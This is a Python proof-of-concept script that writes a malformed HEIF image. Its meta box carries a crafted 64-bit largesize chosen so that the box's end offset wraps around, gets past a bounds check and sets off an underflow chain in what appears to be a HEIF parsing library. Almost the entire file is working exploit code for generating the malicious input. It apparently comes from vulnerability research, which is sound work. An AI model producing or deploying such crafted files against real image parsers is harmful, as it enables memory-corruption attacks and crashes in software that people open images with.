#!/usr/bin/env python3
"""bug17 PoC: meta box with crafted largesize that wraps when added to
meta_box_start, triggering the BitstreamRange underflow chain."""

import sys, os, struct
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "common"))
import heif_box as hb


def main(out_path: str) -> None:
    ftyp = hb.ftyp()
    meta_box_start = len(ftyp)

    # Inner payload of meta box (hdlr + a tiny iloc/iinf so parsing has work to do).
    inner = (hb.fullbox(b"meta", 0, 0,
                        hb.hdlr(b"pict") +
                        hb.pitm(1) +
                        hb.iinf([(1, b"hvc1")]) +
                        hb.iloc(version=1, offset_size=4, length_size=4,
                                base_offset_size=0, index_size=0,
                                items=[{"item_id": 1,
                                        "construction_method": 0,
                                        "data_reference_index": 0,
                                        "extents": [(0, 0, 0)]}])))
    body = inner[8:]   # strip the auto-generated 8-byte header

    # Choose largesize so that meta_box_start + largesize wraps back to a small
    # positive value (<= len(file)). End_of_meta_box must be small enough that
    # `m_max_length < end_of_meta_box` is FALSE — i.e. end_of_meta_box is ≤
    # the file size after wrap.
    target_wrapped_end = 4   # any small value below file size works
    largesize = (1 << 64) - meta_box_start + target_wrapped_end
    print(f"[*] meta_box_start = {meta_box_start}")
    print(f"[*] largesize      = 0x{largesize:016x}")
    print(f"[*] wrapped end    = {(meta_box_start + largesize) & ((1<<64)-1)}")

    meta_with_overflow = (struct.pack(">I", 1) + b"meta" +
                          struct.pack(">Q", largesize) + body)

    out = ftyp + meta_with_overflow
    hb.write_file(out_path, out)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "bug17_poc.heif")
